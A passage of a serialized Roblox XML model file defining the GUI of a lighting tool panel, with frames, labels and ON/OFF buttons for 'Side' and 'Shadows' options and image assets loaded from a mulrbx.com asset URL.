													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX96F67674B8C54731BFE31F6A5D286CEE">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX5E5758587711494F8E2D0AD877BB1742">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX568FE511B7AE4BDAAC5454CDC4E8275F">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">16</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX01E797A118994840B673ECA257D1A2AB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SideOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>115</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXC8CD1985840845768FBE6E8805101845">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Side</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX1DA77D67CA694AE4BAE1BCE6E4558347">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ShadowsOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX69EE0EA6C7DA4D88B052E70568DAE4E2">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Shadows</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXDB54578E58E142E5B1D06E9870746DA8">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">On</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>55</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBXC0BB6D3C1BBE4841B9FCB60408D326F0">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>4</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextButton" referent="RBX46F0A0E978114851823B142C64845C51">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">true</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">Button</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">1</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX8A0F1850D0494F34990712798CAAE3C0">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX15DFC59E3FA94FCC82D9BCA8D848A230">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">Label</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">ON</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX48778F2DB7EE4097AF47A96D886030CB">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Off</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>100</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBXB2BF71A12B29459384DAC62FB24D259B">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>4</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextButton" referent="RBXE72E5567BED04887805783AA998D9BCC">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">true</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">Button</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">1</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXFC8B4890BE08444888F6978EF3BC83F6">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX0FDD0F971B364339A397BF297F732AF3">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">Label</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">OFF</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="TextLabel" referent="RBX7FEC41068A5844DB9BA1B8426AB7F188">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">SelectNote</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>27</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Select something to use this tool.</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">true</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBXE67F194297454CBC8145ED442C8A0835">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.675000012</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">PointLight</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXC506707F04304AA981E1650B95BFA838">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
